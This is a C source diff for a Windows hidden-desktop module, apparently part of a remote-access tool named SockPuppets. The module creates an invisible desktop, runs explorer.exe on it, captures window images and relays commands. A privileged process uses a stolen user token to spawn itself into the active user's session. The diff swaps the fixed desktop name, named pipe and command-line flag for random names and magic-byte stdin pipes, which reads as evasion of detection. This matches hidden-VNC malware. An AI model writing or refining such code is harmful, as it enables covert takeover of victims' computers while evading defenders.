@@ -7,6 +7,10 @@
 
 static HDESK g_hd;
 static int g_is_host;
+static wchar_t g_name[12];
+static wchar_t g_winsta[32];
+static HANDLE g_to_child = INVALID_HANDLE_VALUE;
+static HANDLE g_from_child = INVALID_HANDLE_VALUE;
 
 static char *dupstr(const char *s) {
     size_t n = strlen(s);
@@ -34,11 +38,27 @@ static char *b64(const unsigned char *data, size_t len) {
     return out;
 }
 
+static void desk_name(void) {
+    unsigned s;
+    int i;
+    if (g_name[0]) return;
+    s = GetCurrentProcessId() ^ GetTickCount();
+    g_name[0] = (wchar_t)(L'a' + (s % 26));
+    for (i = 1; i < 8; i++) {
+        s = s * 1664525u + 1013904223u;
+        g_name[i] = L"abcdefghijklmnopqrstuvwxyz0123456789"[s % 36];
+    }
+    g_name[8] = 0;
+    lstrcpyW(g_winsta, L"WinSta0\\");
+    lstrcatW(g_winsta, g_name);
+}
+
 static int ensure(void) {
     if (g_hd) return 1;
-    g_hd = CreateDesktopW(L"SockPuppetsHD", NULL, NULL, 0, 0x10000000, NULL);
-    if (!g_hd) g_hd = OpenDesktopW(L"SockPuppetsHD", 0, FALSE, 0x02000000);
-    if (!g_hd) g_hd = OpenDesktopW(L"SockPuppetsHD", 0, FALSE, 0x10000000);
+    desk_name();
+    g_hd = CreateDesktopW(g_name, NULL, NULL, 0, 0x10000000, NULL);
+    if (!g_hd) g_hd = OpenDesktopW(g_name, 0, FALSE, 0x02000000);
+    if (!g_hd) g_hd = OpenDesktopW(g_name, 0, FALSE, 0x10000000);
     return g_hd != NULL;
 }
 
@@ -56,7 +76,9 @@ static char *do_start(void *arg) {
     const char *exe = arg && ((const char *)arg)[0] ? (const char *)arg : "C:\\Windows\\explorer.exe";
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
-    wchar_t desktop[] = L"WinSta0\\SockPuppetsHD";
+    wchar_t desktop[32];
+    desk_name();
+    lstrcpyW(desktop, g_winsta);
     wchar_t cmd[1024];
     ZeroMemory(&si, sizeof(si));
     ZeroMemory(&pi, sizeof(pi));
@@ -69,14 +91,37 @@ static char *do_start(void *arg) {
         return dupstr("spawn failed");
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-    char buf[64];
-    snprintf(buf, sizeof(buf), "desktop started pid=%lu", pi.dwProcessId);
+    {
+        HDC hdc = GetDC(NULL);
+        RECT rc = {0, 0, 640, 200};
+        HBRUSH br = CreateSolidBrush(RGB(20, 70, 140));
+        FillRect(hdc, &rc, br);
+        DeleteObject(br);
+        ReleaseDC(NULL, hdc);
+    }
+    char buf[80];
+    DWORD sid = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
+    snprintf(buf, sizeof(buf), "desktop started pid=%lu session=%lu", pi.dwProcessId, sid);
     return dupstr(buf);
+}
+
+static BOOL CALLBACK pick_window(HWND hwnd, LPARAM lp) {
+    RECT rc;
+    if (!IsWindowVisible(hwnd)) return TRUE;
+    GetWindowRect(hwnd, &rc);
+    if (rc.right - rc.left < 80 || rc.bottom - rc.top < 80) return TRUE;
+    *(HWND *)lp = hwnd;
+    return FALSE;
 }
 
 static char *do_frame(void *arg) {
     (void)arg;
-    HDC hdc = GetDC(NULL);
+    HWND hwnd = NULL;
+    HDC hdc;
+    EnumWindows(pick_window, (LPARAM)&hwnd);
+    if (!hwnd) hwnd = GetDesktopWindow();
+    hdc = GetDC(hwnd);
     int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
     int dw, dh, stride, y;
     HDC mem;
@@ -92,7 +137,8 @@ static char *do_frame(void *arg) {
     mem = CreateCompatibleDC(hdc);
     bmp = CreateCompatibleBitmap(hdc, dw, dh);
     old = SelectObject(mem, bmp);
-    StretchBlt(mem, 0, 0, dw, dh, hdc, 0, 0, sw, sh, SRCCOPY);
+    if (hwnd) PrintWindow(hwnd, mem, 0);
+    else StretchBlt(mem, 0, 0, dw, dh, hdc, 0, 0, sw, sh, SRCCOPY);
     SelectObject(mem, old);
     ZeroMemory(&bi, sizeof(bi));
     bi.bmiHeader.biSize = 40;
@@ -196,6 +242,28 @@ static int session_id(void) {
     return (int)sid;
 }
 
+static DWORD pick_session(void) {
+    DWORD console = WTSGetActiveConsoleSessionId();
+    PWTS_SESSION_INFOA info = NULL;
+    DWORD count = 0, i, chosen = 0xFFFFFFFF;
+    HANDLE tok = NULL;
+    if (console != 0 && console != 0xFFFFFFFF && WTSQueryUserToken(console, &tok)) {
+        CloseHandle(tok);
+        return console;
+    }
+    if (!WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &info, &count)) return 0xFFFFFFFF;
+    for (i = 0; i < count; i++) {
+        if (info[i].SessionId == 0 || info[i].State != WTSActive) continue;
+        if (WTSQueryUserToken(info[i].SessionId, &tok)) {
+            chosen = info[i].SessionId;
+            CloseHandle(tok);
+            break;
+        }
+    }
+    WTSFreeMemory(info);
+    return chosen;
+}
+
 static int write_all(HANDLE h, const void *buf, DWORD n) {
     const char *p = buf;
     while (n) {
@@ -218,94 +286,112 @@ static int read_all(HANDLE h, void *buf, DWORD n) {
     return 1;
 }
 
-static HANDLE hd_pipe(void) {
-    return CreateFileA("\\\\.\\pipe\\SockPuppetsHD", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-}
-
 static int launch_host(void) {
-    DWORD sid = WTSGetActiveConsoleSessionId();
+    DWORD sid = pick_session();
     HANDLE tok = NULL, dup = NULL;
+    HANDLE cr = NULL, cw = NULL, rr = NULL, rw = NULL;
+    SECURITY_ATTRIBUTES sa;
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    char exe[1024], cmd[1100];
+    unsigned char mag[4] = {0xA7, 0x3C, 0x91, 0x5E};
+    DWORD wrote = 0;
     if (sid == 0xFFFFFFFF || !WTSQueryUserToken(sid, &tok)) return 0;
     if (!DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dup)) {
         CloseHandle(tok);
         return 0;
     }
     CloseHandle(tok);
-    char exe[MAX_PATH], cmd[MAX_PATH + 32];
+    sa.nLength = sizeof(sa);
+    sa.lpSecurityDescriptor = NULL;
+    sa.bInheritHandle = TRUE;
+    if (!CreatePipe(&cr, &cw, &sa, 0) || !CreatePipe(&rr, &rw, &sa, 0)) {
+        CloseHandle(dup);
+        return 0;
+    }
+    SetHandleInformation(cw, HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(rr, HANDLE_FLAG_INHERIT, 0);
+    WriteFile(cw, mag, 4, &wrote, NULL);
     GetModuleFileNameA(NULL, exe, MAX_PATH);
-    snprintf(cmd, sizeof(cmd), "\"%s\" --hd-host", exe);
-    STARTUPINFOA si;
-    PROCESS_INFORMATION pi;
+    snprintf(cmd, sizeof(cmd), "\"%s\"", exe);
     ZeroMemory(&si, sizeof(si));
     ZeroMemory(&pi, sizeof(pi));
     si.cb = sizeof(si);
     si.lpDesktop = "winsta0\\default";
-    if (!CreateProcessAsUserA(dup, NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = cr;
+    si.hStdOutput = rw;
+    si.hStdError = rw;
+    if (!CreateProcessAsUserA(dup, NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
         CloseHandle(dup);
+        CloseHandle(cr); CloseHandle(cw); CloseHandle(rr); CloseHandle(rw);
         return 0;
     }
     CloseHandle(dup);
+    CloseHandle(cr);
+    CloseHandle(rw);
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
+    g_to_child = cw;
+    g_from_child = rr;
     return 1;
 }
 
 static char *via_host(const char *cmd) {
-    HANDLE h = hd_pipe();
-    if (h == INVALID_HANDLE_VALUE) {
-        if (!launch_host()) return dupstr("desktop host failed");
-        for (int i = 0; i < 40 && h == INVALID_HANDLE_VALUE; i++) {
-            Sleep(250);
-            h = hd_pipe();
-        }
-        if (h == INVALID_HANDLE_VALUE) return dupstr("desktop host not ready");
-    }
     DWORD n = (DWORD)strlen(cmd);
     char *out = NULL;
-    if (write_all(h, &n, 4) && write_all(h, cmd, n) && read_all(h, &n, 4) && n < 8 * 1024 * 1024) {
+    if (g_to_child == INVALID_HANDLE_VALUE || g_from_child == INVALID_HANDLE_VALUE) {
+        if (!launch_host()) {
+            char buf[64];
+            snprintf(buf, sizeof(buf), "desktop host failed %lu", GetLastError());
+            return dupstr(buf);
+        }
+    }
+    if (write_all(g_to_child, &n, 4) && write_all(g_to_child, cmd, n) && read_all(g_from_child, &n, 4) && n < 8 * 1024 * 1024) {
         out = (char *)malloc(n + 1);
-        if (out && read_all(h, out, n)) out[n] = 0;
+        if (out && read_all(g_from_child, out, n)) out[n] = 0;
         else { free(out); out = NULL; }
     }
-    CloseHandle(h);
-    return out ? out : dupstr("desktop host io failed");
+    if (!out) {
+        CloseHandle(g_to_child);
+        CloseHandle(g_from_child);
+        g_to_child = g_from_child = INVALID_HANDLE_VALUE;
+        return dupstr("desktop host io failed");
+    }
+    return out;
 }
 
 char *hidden_desktop(const char *cmd);
 
+int hd_take_host(void) {
+    HANDLE in = GetStdHandle(STD_INPUT_HANDLE);
+    unsigned char mag[4], expect[4] = {0xA7, 0x3C, 0x91, 0x5E};
+    DWORD got = 0;
+    if (!in || in == INVALID_HANDLE_VALUE || GetFileType(in) != FILE_TYPE_PIPE) return 0;
+    if (!PeekNamedPipe(in, mag, 4, &got, NULL, NULL) || got < 4 || memcmp(mag, expect, 4) != 0) return 0;
+    ReadFile(in, mag, 4, &got, NULL);
+    return 1;
+}
+
 int hd_host_main(void) {
-    SECURITY_DESCRIPTOR sd;
-    SECURITY_ATTRIBUTES sa;
+    HANDLE in = GetStdHandle(STD_INPUT_HANDLE);
+    HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
     g_is_host = 1;
     if (!ensure()) return 1;
     on_desktop(do_start, "C:\\Windows\\explorer.exe");
-    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
-    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
-    sa.nLength = sizeof(sa);
-    sa.lpSecurityDescriptor = &sd;
-    sa.bInheritHandle = FALSE;
     for (;;) {
-        HANDLE pipe = CreateNamedPipeA("\\\\.\\pipe\\SockPuppetsHD", PIPE_ACCESS_DUPLEX,
-            PIPE_TYPE_BYTE | PIPE_WAIT, 1, 1 << 20, 1 << 20, 0, &sa);
-        if (pipe == INVALID_HANDLE_VALUE) return 1;
-        if (ConnectNamedPipe(pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
-            DWORD n = 0;
-            if (read_all(pipe, &n, 4) && n < 4096) {
-                char *cmd = (char *)malloc(n + 1);
-                if (cmd && read_all(pipe, cmd, n)) {
-                    char *resp;
-                    cmd[n] = 0;
-                    resp = hidden_desktop(cmd);
-                    n = (DWORD)strlen(resp);
-                    write_all(pipe, &n, 4);
-                    write_all(pipe, resp, n);
-                    free(resp);
-                }
-                free(cmd);
-            }
-        }
-        DisconnectNamedPipe(pipe);
-        CloseHandle(pipe);
+        DWORD n = 0;
+        char *cmd, *resp;
+        if (!read_all(in, &n, 4) || n > 4096) return 0;
+        cmd = (char *)malloc(n + 1);
+        if (!cmd || !read_all(in, cmd, n)) return 0;
+        cmd[n] = 0;
+        resp = hidden_desktop(cmd);
+        free(cmd);
+        n = (DWORD)strlen(resp);
+        write_all(out, &n, 4);
+        write_all(out, resp, n);
+        free(resp);
     }
 }
 
